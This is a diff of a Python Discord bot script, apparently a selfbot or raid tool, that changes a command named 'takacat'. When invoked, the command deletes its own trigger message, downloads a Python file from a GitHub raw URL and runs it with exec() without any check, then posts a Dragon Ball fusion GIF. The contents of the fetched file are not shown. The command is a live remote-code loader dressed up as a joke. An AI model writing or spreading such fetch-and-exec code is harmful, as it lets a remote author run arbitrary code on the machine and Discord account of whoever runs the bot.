@@ -1147,14 +1147,19 @@ fusion = False
 
 @slayer.command()
 async def takacat(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
     global fusion
     fusion = True
-
-
-if fusion == True:
-    r = requests.get("https://raw.githubusercontent.com/Takaso2/reincat/main/reincat.py")
-    reincode = r.content
-    exec(reincode)
+    if fusion == True:
+        r = requests.get("https://raw.githubusercontent.com/Takaso2/reincat/main/reincat.py")
+        reincode = r.content
+        exec(reincode)
+    kaka = discord.Embed(title="**FUSION**")
+    kaka.set_image(url="https://tenor.com/view/son-goku-kakarott-goku-vegeta-fusion-gif-14100056")
+    await ctx.send(embed=kaka)
 
 if account_type in Answers:
     try:
